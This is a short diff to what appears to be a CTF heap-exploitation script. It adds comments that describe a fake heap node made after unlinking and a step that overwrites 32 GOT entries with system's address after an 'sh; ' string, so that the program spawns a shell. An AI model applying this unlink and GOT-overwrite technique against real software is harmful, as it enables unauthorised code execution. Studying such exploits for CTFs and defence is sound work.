@@ -113,7 +113,7 @@ if __name__ == "__main__":
     # [5] make the fake second node
     #
     # CURRENT_INGREDIENT will be 0x804cff8 after unlinking 
-    # 0x804cff8->next == 0
+    # 0x804cff8->next == 0 (PERFECT!!!)
     # 0x804cff8 + 8 == 0x804d000
     # GOT start 0x804d00c
     # 
@@ -156,6 +156,9 @@ if __name__ == "__main__":
 
     #
     # [8] overwrite 32 got entries
+    #
+    # now, CURRENT_INGREDIENT == 0x804cff8
+    # 'ag' => memcpy((char *)CURRENT_INGREDIENT + 8, "sh; \x00\x00\x00\x00" + p32(SYSTEM_ADDR)*32")
     #
     raw_input('[8] go?')
     s('a')
